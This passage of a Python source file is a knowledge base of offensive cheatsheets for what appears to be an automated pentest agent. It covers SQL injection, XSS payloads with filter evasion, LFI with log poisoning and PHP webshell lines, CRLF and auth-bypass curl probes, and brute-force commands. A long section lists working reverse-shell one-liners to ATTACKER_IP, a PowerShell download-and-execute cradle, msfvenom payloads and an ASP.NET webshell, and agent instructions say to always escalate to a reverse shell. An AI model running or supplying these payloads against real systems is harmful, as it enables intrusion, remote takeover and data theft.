        "learned_prompt": "Detect ASP via .asp/.aspx URLs and ASP.NET_SessionId cookies. Run sqlmap with --dbms=mssql first, then wapiti -m sql,blindsql. Probe 'search', 'id', 'q', 'category' parameters. Verify with WAITFOR DELAY '0:0:10' for time-based confirmation. Never stop at single tool execution — chain at least 2 tools.",
        "affected_phases": ["P11", "P12", "P13", "P14"],
        "affected_skills": ["risk_assessment", "exploitation", "injection_battery"],
        "recommended_tools": ["sqlmap", "wapiti", "ghauri", "nuclei", "dalfox"],
        "learned_techniques": [
            {"name": "ASP/MSSQL boolean blind on search", "phase": "P11", "tool": "sqlmap"},
            {"name": "MSSQL union-based extraction", "phase": "P12", "tool": "sqlmap"},
            {"name": "MSSQL WAITFOR DELAY time-based", "phase": "P12", "tool": "sqlmap"},
            {"name": "MSSQL error-based via HAVING/CONVERT", "phase": "P12", "tool": "wapiti"},
            {"name": "MSSQL stacked queries + xp_cmdshell", "phase": "P14", "tool": "sqlmap"},
            {"name": "Auth bypass via ' OR 1=1--", "phase": "P11", "tool": "manual"},
            {"name": "WAF bypass with comment/case/hex", "phase": "P12", "tool": "sqlmap"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # XSS — Context-based payloads + filter evasion (n0p.net mirror)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "XSS Cheatsheet - Context-based payloads + filter evasion",
        "vulnerability_type": "Cross-Site Scripting",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://n0p.net/penguicon/php_app_sec/mirror/xss.html"],
        "summary": "Reflected, stored e DOM XSS com payloads por contexto (HTML body, atributo, JS string, URL, CSS). Inclui bypass de filtro via encoding, case, null-byte e tag fragmentada.",
        "steps_to_reproduce": """
PROBE INICIAL (canário):
  '';!--"<XSS>=&{()}
  Se aparecer '<XSS' no HTML (não escapado) há reflexão.

CONTEXT: HTML BODY
  <script>alert(1)</script>
  <img src=x onerror=alert(1)>
  <svg onload=alert(1)>
  <iframe src="javascript:alert(1)">
  <body onload=alert(1)>
  <details open ontoggle=alert(1)>
  <math><mtext></mtext><script>alert(1)</script></math>

CONTEXT: HTML ATTRIBUTE
  " onmouseover=alert(1) x="
  ' autofocus onfocus=alert(1) '
  " onerror=alert(1) src=x "
  javascript:alert(1)           (when injected into href)

CONTEXT: JS STRING (inside <script> var x='INPUT')
  '; alert(1); //
  \\'; alert(1); //
  </script><script>alert(1)</script>

CONTEXT: URL (href, src, action)
  javascript:alert(1)
  javasc&#9;ript:alert(1)
  data:text/html,<script>alert(1)</script>

CONTEXT: CSS (style attribute)
  expression(alert(1))           (IE legacy)
  background:url("javascript:alert(1)")

FILTER EVASION:
  Mixed case:               <ScRiPt>alert(1)</sCrIpT>
  Numeric HTML entities:    &#60;script&#62;alert(1)&#60;/script&#62;
  Hex entities:             &#x3C;script&#x3E;
  Zero padding:             &#0000060script&#0000062
  Tab inside scheme:        jav&#x09;ascript:alert(1)
  Newline inside scheme:    jav&#x0A;ascript:alert(1)
  Quote-broken src:         <SCRIPT a=">" SRC="//evil/x.js"></SCRIPT>
  Recursive-removal:        <scr<script>ipt>alert(1)</scr</script>ipt>

DOM XSS SINKS (search JS):
  document.location, document.URL, document.referrer
  innerHTML, outerHTML, document.write, eval, setTimeout
  jQuery: $('#x').html(input), $.parseHTML

AUTOMATION:
  dalfox url https://target/page --custom-payload payloads.txt --waf-evasion --silence
  dalfox file urls.txt --cookie "session=..." --output dalfox.txt
  XSStrike -u "https://target/page?q=FUZZ" --crawl --skip-poc
  kxss < params.txt
  Pulse JS: katana -u https://target -jc -kf all | grep "\\.js$" | httpx -silent | xargs -I@ curl -s @ | grep -E "(innerHTML|document\\.write|eval\\()"

EVIDENCE TO CAPTURE:
  - HTTP request + parameter reflected
  - DOM screenshot or alert() trigger
  - dalfox/XSStrike PoC URL
  - Response body showing unescaped payload
""",
        "impact": "Session hijack via cookie theft, credential phishing via injected forms, drive-by exploit chaining, ATO, defacement.",
        "remediation": "Output encode by context (HtmlEncoder.Default vs JavaScriptEncoder vs UrlEncoder). Apply strict CSP (default-src 'self'; script-src 'self'). HttpOnly + Secure + SameSite=Lax on session cookies. Validate URL schemes (allowlist http/https). Use trusted-types in modern browsers.",
        "learned_mission": "Para cada parâmetro refletido, identificar contexto (HTML body / attr / JS / URL / CSS) e escolher payload por contexto. Sempre rodar dalfox + XSStrike (ou nuclei xss templates) para triangular reflexão e DOM.",
        "learned_prompt": "Reflect canary '';!--\"<XSS>=&{()} first. Then context-specific payload. Always pair dalfox with a second tool (XSStrike, kxss, nuclei dast-xss) before promoting to finding.",
        "affected_phases": ["P12", "P13"],
        "affected_skills": ["risk_assessment", "exploitation", "injection_battery"],
        "recommended_tools": ["dalfox", "nuclei", "wapiti", "katana", "httpx"],
        "learned_techniques": [
            {"name": "Reflected XSS body context", "phase": "P12", "tool": "dalfox"},
            {"name": "Reflected XSS attribute context", "phase": "P12", "tool": "dalfox"},
            {"name": "DOM XSS sink discovery", "phase": "P12", "tool": "katana"},
            {"name": "Filter evasion (case/hex/tab)", "phase": "P12", "tool": "dalfox"},
            {"name": "Stored XSS hunt", "phase": "P13", "tool": "wapiti"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # LFI / Path Traversal — highon.coffee cheatsheet
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "LFI / Path Traversal Cheatsheet (highon.coffee)",
        "vulnerability_type": "Local File Inclusion",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://highon.coffee/blog/lfi-cheat-sheet/"],
        "summary": "Local File Inclusion + path traversal: PHP wrappers (php://filter, php://input, expect://, data://), /proc/self/* targets para code-exec via headers, log poisoning, e bypass por null-byte. Inclui alvos Windows comuns.",
        "steps_to_reproduce": """
DISCOVERY (parâmetros candidatos):
  ?page=, ?file=, ?path=, ?include=, ?template=, ?lang=, ?view=, ?doc=

CANARY PROBES:
  /page.php?file=../../../../../../etc/passwd
  /page.php?file=....//....//....//etc/passwd     (dot-dot bypass)
  /page.php?file=..%2f..%2f..%2fetc%2fpasswd      (url-encode)
  /page.php?file=..%252f..%252fetc%252fpasswd     (double encode)
  /page.php?file=/etc/passwd%00                    (PHP <5.3.4 null byte)
  /page.php?file=/etc/passwd%2500
  /page.php?file=php://filter/convert.base64-encode/resource=index.php  (source disclosure)

PHP WRAPPERS:
  php://filter/convert.base64-encode/resource=../config.php
  php://filter/read=string.rot13/resource=index.php
  php://input            (POST body becomes file content — RCE if eval)
       POST body: <?php system('id'); ?>
  data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+   (b64 of <?php system('id');?>)
  expect://id            (RCE if expect ext loaded)
  zip://shell.zip%23shell.php
  phar://image.jpg/payload.txt

PROC TARGETS (Linux):
  /proc/self/environ      (poison via User-Agent: <?php system($_GET[c]); ?>)
  /proc/self/cmdline
  /proc/self/status
  /proc/self/fd/0, fd/1, fd/2 ... fd/255
  /proc/version
  /proc/sched_debug

LOG POISONING:
  Inject in User-Agent: <?php system($_GET['cmd']); ?>
  Then include: /page.php?file=/var/log/apache2/access.log&cmd=id
  Other targets: /var/log/nginx/access.log, /var/log/auth.log,
                 /var/log/vsftpd.log, /var/log/exim/mainlog

SESSION POISONING (PHP):
  Inject payload in $_SESSION (any field reflected to session file)
  Include: /page.php?file=/var/lib/php/sessions/sess_<PHPSESSID>

WINDOWS TARGETS:
  ..\\..\\..\\..\\windows\\win.ini
  ..\\..\\..\\..\\boot.ini
  ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
  ..\\..\\..\\windows\\system32\\config\\sam
  C:\\inetpub\\wwwroot\\web.config         (ASP/IIS)
  C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config

ASP.NET TARGETS (when LFI in IIS):
  /page.aspx?path=..\\..\\..\\web.config
  /page.aspx?path=..\\..\\Global.asax
  /page.aspx?path=..\\..\\bin\\<App>.dll    (then ILSpy/dotpeek for source)

AUTOMATION:
  fimap -u "https://target/page.php?file=index.php"
  liffy "https://target/page.php?file=index.php"
  wfuzz -c -w lfi-payloads.txt -u "https://target/page.php?file=FUZZ" --hc 404
  nuclei -u https://target -t http/vulnerabilities/generic/generic-lfi.yaml
  kadimus -u "https://target/page.php?file=FUZZ"

EVIDENCE TO CAPTURE:
  - HTTP request showing parameter and payload
  - Response containing /etc/passwd or web.config content
  - php://filter base64 output decoded to source
  - For log poisoning: PoC RCE via include of access.log
""",
        "impact": "Code execution via wrapper/log poisoning, source code disclosure (php://filter), credential theft via /etc/shadow attempt or web.config (IIS), lateral discovery via /proc enumeration.",
        "remediation": "Allowlist file names (basename + extension check). Never concatenate user input into include()/require(). Disable PHP wrappers via allow_url_include=0 and allow_url_fopen=0. Set open_basedir. Use a static dispatcher map (id -> file).",
        "learned_mission": "Identificar parâmetros tipo ?file= / ?page= / ?include=. Testar travessia simples, depois php://filter (b64), depois /proc/self/environ + User-Agent poison. Em IIS/ASP.NET tentar web.config e ..\\..\\bin\\<App>.dll.",
        "learned_prompt": "Probe ?file= and ?page= with ../../../../etc/passwd and php://filter/convert.base64-encode/resource=index.php. If PHP, try /proc/self/environ + UA poison. For Windows/IIS try web.config and applicationHost.config. Always pair fimap with nuclei generic-lfi template.",
        "affected_phases": ["P12", "P13"],
        "affected_skills": ["risk_assessment", "exploitation", "injection_battery"],
        "recommended_tools": ["fimap", "wfuzz", "ffuf", "nuclei", "kadimus", "wapiti"],
        "learned_techniques": [
            {"name": "Path traversal /etc/passwd", "phase": "P12", "tool": "fimap"},
            {"name": "php://filter source disclosure", "phase": "P12", "tool": "fimap"},
            {"name": "/proc/self/environ + UA poison", "phase": "P13", "tool": "manual"},
            {"name": "Log poisoning via access.log", "phase": "P13", "tool": "manual"},
            {"name": "IIS/ASP.NET web.config read", "phase": "P12", "tool": "ffuf"},
            {"name": "Null byte bypass", "phase": "P12", "tool": "wfuzz"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # Reverse Shell one-liners (highon.coffee)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Reverse Shell One-Liners (highon.coffee)",
        "vulnerability_type": "Post-Exploitation",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://highon.coffee/blog/reverse-shell-cheat-sheet/"],
        "summary": "Reverse shell one-liners por linguagem/runtime: bash, python, perl, php, ruby, netcat (várias variantes), powershell, java, telnet, socat, node, awk, lua, msfvenom. Útil após RCE/LFI/SQLi+xp_cmdshell.",
        "steps_to_reproduce": """
ATTACKER LISTENER (escolha um):
  nc -lvnp 4444
  rlwrap nc -lvnp 4444            (history + arrow keys)
  socat -d -d TCP4-LISTEN:4444 STDOUT
  pwncat-cs -lp 4444              (modern handler)

BASH:
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
  0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444; sh <&196 >&196 2>&196
  bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

PYTHON (3 most common):
  python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
  python -c 'import os;os.system("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")'

PERL:
  perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

PHP (one-line):
  php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
  Embedded in webshell:
    <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>

RUBY:
  ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

NETCAT:
  nc -e /bin/sh ATTACKER_IP 4444                       (only if -e supported)
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f   (fifo)
  ncat ATTACKER_IP 4444 -e /bin/bash --ssl              (encrypted)

TELNET (when nc absent):
  mknod backpipe p && telnet ATTACKER_IP 4444 0<backpipe | /bin/bash 1>backpipe

POWERSHELL (Windows IIS / ASP.NET RCE):
  powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"
  Short variant via downloader:
    powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rs.ps1')"

JAVA:
  r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/4444;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]); p.waitFor()

SOCAT (full TTY):
  attacker:  socat file:`tty`,raw,echo=0 tcp-listen:4444
  victim:    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

NODE.JS:
  require('child_process').exec('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')

AWK:
  awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

LUA:
  lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP',4444);os.execute('/bin/sh -i <&3 >&3 2>&3');"

MSFVENOM PAYLOADS:
  msfvenom -p linux/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf -o shell
  msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe
  msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.php
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw -o shell.jsp

POST-CONNECT TTY UPGRADE:
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  Ctrl+Z ; stty raw -echo ; fg ; export TERM=xterm

ASP.NET WEBSHELL (drop+exec):
  <%@ Page Language="C#" %><%System.Diagnostics.Process.Start("powershell.exe","-c \\"IEX(New-Object Net.WebClient).DownloadString('http://A/rs.ps1')\\"");%>
""",
        "impact": "Interactive shell on target, persistence staging, lateral pivot, data exfiltration. Required step for actions-on-objectives.",
        "remediation": "Egress filtering (block outbound to internet from server VLAN). EDR with reverse-shell heuristics. Disable bash for service accounts. AppLocker / SELinux confined daemons. Audit /proc/*/net/tcp.",
        "learned_mission": "Após confirmar RCE/RFI/xp_cmdshell, sempre escalar para shell reverso. Prefira python3 pty se python existir, senão bash /dev/tcp. Em Windows/IIS use powershell -nop -c. Sempre subir nc -lvnp 4444 ou pwncat-cs antes do PoC.",
        "learned_prompt": "After RCE primitive, drop a reverse shell. Match language to target: PHP→php -r, ASP.NET→powershell -nop, generic Linux→bash /dev/tcp. Upgrade TTY with python pty. Listener: rlwrap nc -lvnp 4444.",
        "affected_phases": ["P14", "P15", "P16"],
        "affected_skills": ["exploitation", "actions_on_objectives", "command_and_control"],
        "recommended_tools": ["nc", "ncat", "socat", "msfvenom", "pwncat-cs", "powershell"],
        "learned_techniques": [
            {"name": "Bash /dev/tcp reverse shell", "phase": "P14", "tool": "bash"},
            {"name": "Python pty reverse shell", "phase": "P14", "tool": "python3"},
            {"name": "PHP reverse one-liner", "phase": "P14", "tool": "php"},
            {"name": "Powershell reverse (Win/IIS)", "phase": "P14", "tool": "powershell"},
            {"name": "Netcat fifo reverse shell", "phase": "P14", "tool": "nc"},
            {"name": "MSFvenom multi-platform payload", "phase": "P14", "tool": "msfvenom"},
            {"name": "Full-TTY socat reverse", "phase": "P14", "tool": "socat"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # Pentest tool command reference (pentestmindmap.com)
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "Pentest Tool Invocation Reference (pentestmindmap)",
        "vulnerability_type": "Methodology",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://pentestmindmap.com/cheatsheet"],
        "summary": "Comandos canônicos de execução para ferramentas Kali essenciais. Use como referência ao escolher invocações dentro de cada skill.",
        "steps_to_reproduce": """
NMAP (recon → vuln):
  nmap -sC -sV -oA scan TARGET                       (default scripts + version)
  nmap -p- -T4 -oA full TARGET                       (all ports, fast)
  nmap -sV --script=vuln -oA vuln TARGET             (NSE vuln scripts)
  nmap -sU --top-ports 50 TARGET                     (UDP top 50)

NIKTO (web misconfig):
  nikto -h https://TARGET -ask no -nointeractive -maxtime 600s -Tuning 123bde -Display V
  nikto -h https://TARGET -id user:pass -Cookies     (authenticated scan)
  nikto -h TARGET -port 8080,443                     (multi-port)
  Note: NÃO use -Format json sem -output FILE; sai com erro.

SQLMAP:
  sqlmap -u "https://T/page.asp?id=1" --dbms=mssql --batch --random-agent
  sqlmap -u "https://T/page.asp?id=1" --level=5 --risk=3 --technique=BEUSTQ --batch
  sqlmap -u "https://T/form" --data "search=test" --cookie "ASP.NET_SessionId=..." --batch
  sqlmap -r request.txt --batch --tamper=between,space2comment

GOBUSTER / FFUF / FEROXBUSTER (content discovery):
  gobuster dir -u https://T -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50 -x php,aspx,asp,html
  ffuf -u "https://T/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fc 404 -ac
  ffuf -u "https://T/page.asp?FUZZ=test" -w params.txt -fs 1234     (param fuzz, filter size)
  feroxbuster -u https://T -w wordlist.txt -x asp,aspx -s 200,301,302

HYDRA / MEDUSA (brute):
  hydra -L users.txt -P passwords.txt ssh://TARGET -t 4 -o creds.txt
  hydra -L users.txt -P passwords.txt TARGET http-post-form "/login.asp:user=^USER^&pass=^PASS^:F=Invalid"
  medusa -h TARGET -U users.txt -P pass.txt -M smbnt -O medusa.log

WPSCAN (WordPress):
  wpscan --url https://T --enumerate u,vp,vt --api-token KEY
  wpscan --url https://T --usernames admin --passwords rockyou.txt

NUCLEI (templated DAST):
  nuclei -u https://T -severity critical,high,medium -rl 150 -silent
  nuclei -l hosts.txt -tags cve,exposure,misconfig -severity high,critical
  nuclei -u https://T -t http/vulnerabilities/generic/generic-lfi.yaml
  nuclei -u https://T -t http/cves/2023/                 (year-scoped CVEs)

DIRB / DIRSEARCH:
  dirb https://T /usr/share/wordlists/dirb/common.txt -S -w
  dirsearch -u https://T -e asp,aspx,php,html -t 50 -i 200,301

WFUZZ (param/header fuzz):
  wfuzz -c -w wordlist.txt --hc 404 "https://T/page.asp?FUZZ=test"
  wfuzz -c -w params.txt -H "X-Forwarded-For: FUZZ" --hc 200 https://T/admin

DNSENUM / DNSRECON:
  dnsenum --dnsserver 8.8.8.8 -f wordlist.txt TARGET
  dnsrecon -d TARGET -t std,brt,axfr -D wordlist.txt

THEHARVESTER (OSINT):
  theHarvester -d TARGET -b duckduckgo,crtsh,hackertarget,bing,otx -l 200

MASSCAN (fast port scan):
  masscan -p1-65535 --rate 5000 -e tun0 TARGET/24 -oG masscan.gnmap

SMBCLIENT / ENUM4LINUX:
  smbclient -L //TARGET -N                                (anonymous list)
  smbclient //TARGET/share -U guest%
  enum4linux -a TARGET
  crackmapexec smb TARGET -u users.txt -p passwords.txt

DALFOX / XSSTRIKE (XSS):
  dalfox url https://T/page?q=test --waf-evasion --silence
  dalfox file urls.txt --output dalfox.txt
  XSStrike -u "https://T/page?q=FUZZ" --crawl

WAPITI (web):
  wapiti -u https://T -m sql,blindsql,xss,exec,file,xxe,csrf -f json -o report.json

KATANA / GOSPIDER (crawl):
  katana -u https://T -d 10 -jc -kf all -aff -silent
  gospider -s https://T -c 20 -d 5 --sitemap --robots --js

INTERACTSH (OOB):
  interactsh-client -v                                    (gets unique callback domain)

CRACKMAPEXEC (AD):
  crackmapexec smb DC_IP -u user -p pass --shares
  crackmapexec winrm TARGET -u admin -H NTLM_HASH
""",
        "impact": "Reference only - enables correct tool invocation. Misuse (e.g. nikto -Format json without -output) causes silent failures.",
        "remediation": "n/a (reference).",
        "learned_mission": "Ao invocar uma ferramenta dentro de uma skill, consultar primeiro este reference. Para nikto, NUNCA usar -Format json sem -output. Para sqlmap em ASP, sempre fixar --dbms=mssql. Para hydra HTTP, montar a fail-string correta (F=Invalid).",
        "learned_prompt": "Use canonical command per tool. nikto needs -ask no -nointeractive -maxtime. sqlmap on ASP needs --dbms=mssql --batch. ffuf with -fc 404 -ac. nuclei with -severity flag. Hydra http-post-form needs explicit F=fail string.",
        "affected_phases": ["P02", "P03", "P11", "P12", "P13", "P14"],
        "affected_skills": ["asset_discovery", "risk_assessment", "exploitation", "tool_usage", "injection_battery"],
        "recommended_tools": [
            "nmap", "nikto", "sqlmap", "gobuster", "ffuf", "feroxbuster",
            "hydra", "wpscan", "nuclei", "dalfox", "wapiti", "katana",
            "interactsh-client", "crackmapexec", "wfuzz", "masscan", "smbclient",
        ],
        "learned_techniques": [
            {"name": "Nmap default+vuln scan", "phase": "P02", "tool": "nmap"},
            {"name": "Nikto safe invocation", "phase": "P12", "tool": "nikto"},
            {"name": "SQLmap MSSQL targeting", "phase": "P12", "tool": "sqlmap"},
            {"name": "FFUF content+param fuzzing", "phase": "P03", "tool": "ffuf"},
            {"name": "Nuclei templated DAST", "phase": "P12", "tool": "nuclei"},
            {"name": "Dalfox XSS automation", "phase": "P12", "tool": "dalfox"},
            {"name": "Hydra HTTP form brute", "phase": "P14", "tool": "hydra"},
            {"name": "Crackmapexec SMB enum", "phase": "P14", "tool": "crackmapexec"},
        ],
    },
    # ─────────────────────────────────────────────────────────────────────
    # curl-based validations (EdOverflow bugbounty-cheatsheet) — checks
    # done OUTSIDE the heavy tools. Cheap, fast, every recon should run
    # at least the security-header + method probes before nuclei/sqlmap.
    # ─────────────────────────────────────────────────────────────────────
    {
        "title": "curl probes - HTTP method / verb tampering (EdOverflow)",
        "vulnerability_type": "Access Control",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet"],
        "summary": "Sondagens curl que validam controle de acesso por método HTTP. Endpoints que aceitam apenas GET frequentemente caem se requisitados via POST/PUT/DELETE/PATCH/TRACE.",
        "steps_to_reproduce": """
1) Enumerar metodos aceitos:
   curl -sk -X OPTIONS -i https://T/api/resource | grep -i allow

2) Verbo override via header:
   curl -sk -i https://T/api/resource -H "X-HTTP-Method-Override: PUT"
   curl -sk -i https://T/api/resource -H "X-Method-Override: DELETE"
   curl -sk -i https://T/api/resource -H "X-HTTP-Method: PUT"

3) Verbo nao listado:
   curl -sk -X PUT     -i https://T/admin/user/1
   curl -sk -X DELETE  -i https://T/admin/user/1
   curl -sk -X PATCH   -i https://T/admin/user/1
   curl -sk -X TRACE   -i https://T/

4) Idempotent + verb mistura:
   curl -sk -X POST    -H "X-HTTP-Method: GET" -i https://T/login

EVIDENCE TO CAPTURE:
  - status code 200/201/204 em verbo nao autorizado
  - Allow: header revelando metodos extras
  - resposta diferente entre GET e POST no mesmo endpoint
""",
        "impact": "Bypass de WAF, RBAC fraco em rotas write, exposicao de TRACE (XST), modificacao de dados via verbo \"trusted\".",
        "remediation": "Restringir verbos por rota; rejeitar X-HTTP-Method-Override em prod; desabilitar TRACE.",
        "learned_mission": "Antes de qualquer scanner pesado, fazer probes curl em verbos HTTP para mapear superficie write/admin.",
        "learned_prompt": "Run `curl -X OPTIONS` then PUT/DELETE/PATCH/TRACE on every promising path. Test X-HTTP-Method-Override header.",
        "affected_phases": ["P05", "P06", "P14", "P15", "P19"],
        "affected_skills": ["asset_discovery", "tech-http-fingerprint", "risk_assessment", "vuln-auth-bypass"],
        "recommended_tools": ["curl", "curl-headers", "httpx", "ffuf"],
        "learned_techniques": [
            {"name": "OPTIONS allow-list discovery", "phase": "P05", "tool": "curl-headers"},
            {"name": "X-HTTP-Method-Override bypass", "phase": "P14", "tool": "curl-headers"},
            {"name": "Verb tampering on admin paths", "phase": "P19", "tool": "curl-headers"},
            {"name": "TRACE/XST probe", "phase": "P05", "tool": "curl-headers"},
        ],
    },
    {
        "title": "curl probes - Header injection / CRLF (EdOverflow)",
        "vulnerability_type": "CRLF Injection",
        "source_kind": "vendor_cheatsheet",
        "source_urls": [
            "https://github.com/EdOverflow/bugbounty-cheatsheet",
            "https://raw.githubusercontent.com/EdOverflow/bugbounty-cheatsheet/master/cheatsheets/crlf.md",
        ],
        "summary": "Payloads CRLF para HTTP response splitting / header injection. Validados via curl observando se o cabecalho injetado aparece na resposta.",
        "steps_to_reproduce": """
1) CRLF basic via query parameter:
   curl -sk -i "https://T/?next=%0d%0aSet-Cookie:csrf_token=PWNED;"
   curl -sk -i "https://T/?redirect=%0d%0aheader:header"
   curl -sk -i "https://T/login%0d%0aSet-Cookie:session=evil"

2) CRLF chained with open redirect:
   curl -sk -i "https://T/redirect?url=//google.com/%2f%2e%2e%0d%0aX-Injected:1"

3) Double encoding bypass:
   curl -sk -i "https://T/%250aheader:header"
   curl -sk -i "https://T/%25250aheader:header"
   curl -sk -i "https://T/%u000aheader:header"

4) Twitter/Yandex variant (encoded unicode CRLF):
   curl -sk -i "https://T/?q=%E5%98%8A%E5%98%8Dheader:header"

5) CRLF -> XSS via response split:
   curl -sk -i "https://T/?next=%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(1)>"

6) Inspect for header in response:
   curl -sk -D - "https://T/?x=%0d%0aX-Injected:1" | grep -i 'X-Injected'

EVIDENCE TO CAPTURE:
  - Header injetado aparece na resposta HTTP
  - Set-Cookie controlado pelo atacante chega ao browser
  - Status 301/302 com Location header malicioso
""",
        "impact": "Session fixation, cache poisoning, XSS via response splitting, open redirect cross-site, auth bypass.",
        "remediation": "Sanitizar CR/LF antes de echo em headers; usar API HTTP que reject newlines em valores.",
        "learned_mission": "Para todo parametro que aparece em Location/Set-Cookie, testar CRLF com payloads %0d%0a, %25%30a, %u000a, %E5%98%8A.",
        "learned_prompt": "On every redirect/cookie-controlling param, inject %0d%0aX-Test:1 and check the response with `curl -D -` for the X-Test header.",
        "affected_phases": ["P05", "P12", "P13", "P19"],
        "affected_skills": ["risk_assessment", "vuln-information-disclosure", "vuln-injection"],
        "recommended_tools": ["curl", "curl-headers", "nuclei", "wapiti"],
        "learned_techniques": [
            {"name": "CRLF in redirect param", "phase": "P12", "tool": "curl-headers"},
            {"name": "Double-encoded CRLF bypass", "phase": "P12", "tool": "curl-headers"},
            {"name": "Unicode CRLF (Twitter)", "phase": "P12", "tool": "curl-headers"},
            {"name": "CRLF -> XSS response splitting", "phase": "P12", "tool": "curl-headers"},
        ],
    },
    {
        "title": "curl probes - Login / Auth POST tampering (EdOverflow)",
        "vulnerability_type": "Authentication Bypass",
        "source_kind": "vendor_cheatsheet",
        "source_urls": ["https://github.com/EdOverflow/bugbounty-cheatsheet"],
        "summary": "Testes curl em endpoints de login: SQLi no usuario/senha, bypass por null byte, JSON vs form, credenciais default, brute-force baseline.",
        "steps_to_reproduce": """
1) SQLi clasico no login (form-urlencoded):
   curl -sk -i -X POST https://T/login -d "username=admin'--&password=anything"
   curl -sk -i -X POST https://T/login -d "username=' OR '1'='1&password=x"
   curl -sk -i -X POST https://T/login -d "username=admin'/*&password=x"

2) SQLi no login (JSON content-type):
   curl -sk -i -X POST https://T/api/login \\
        -H "Content-Type: application/json" \\
        -d '{"username":"admin'\\''--","password":"x"}'

3) Type juggling (PHP/Node):
   curl -sk -i -X POST https://T/api/login \\
        -H "Content-Type: application/json" \\
        -d '{"username":"admin","password":true}'
   curl -sk -i -X POST https://T/api/login \\
        -H "Content-Type: application/json" \\
        -d '{"username":"admin","password":{"$ne":null}}'   # NoSQL/Mongo

4) Header-based identity spoof:
   curl -sk -i https://T/admin -H "X-Forwarded-For: 127.0.0.1"
   curl -sk -i https://T/admin -H "X-Original-URL: /admin"
   curl -sk -i https://T/admin -H "X-Rewrite-URL: /admin"
   curl -sk -i https://T/admin -H "Host: localhost"

5) JWT alg=none (decode JWT, set alg, resign):
   echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0
   curl -sk -i https://T/api/me -H "Authorization: Bearer <none-token>"

6) Credenciais default web/aspnet:
   for c in admin:admin admin:password administrator:administrator sa:sa root:root test:test; do
     curl -sk -i -X POST https://T/login -d "username=${c%:*}&password=${c#*:}"
   done

7) Baseline para hydra (anota response length de sucesso vs falha):
   curl -sk -o /dev/null -w "%{size_download}\\n" -X POST https://T/login -d "username=fake&password=fake"

EVIDENCE TO CAPTURE:
  - Status 200 + Set-Cookie de sessao em vez de 401/redirect
  - Resposta de tamanho diferente entre user valido vs invalido
  - Erro SQL no body apos payload com aspa
""",
        "impact": "Account takeover, privilege escalation, mass enumeration de usuarios validos via differential response.",
        "remediation": "Prepared statements; rate limiting; constant-time auth response; reject controls headers X-Forwarded-* em rotas privilegiadas; usar exp/iat estritos em JWT; verificar alg em allowlist.",
        "learned_mission": "Em todo login encontrado, rodar bateria curl: SQLi clasica, JSON type juggling, X-Forwarded headers, credenciais default. Esses 4 testes pegam 80% dos auth bypass triviais.",
